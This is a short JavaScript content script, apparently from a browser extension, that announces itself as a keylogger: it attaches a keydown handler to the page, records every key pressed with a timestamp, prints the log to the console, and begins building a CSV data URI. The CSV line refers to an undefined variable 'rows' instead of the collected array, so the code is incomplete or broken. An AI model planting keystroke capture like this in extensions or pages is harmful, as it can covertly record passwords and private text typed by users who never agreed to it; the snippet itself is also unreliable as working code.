console.log("keylogger content script loaded")
const data = []
document.onkeydown = (event) => {
    data.push([event.key, Date.now()])
    console.log(data)
}
let csvContent = "data:text/csv;charset=utf-8," 
    + rows.map(e => e.join(",")).join("\n");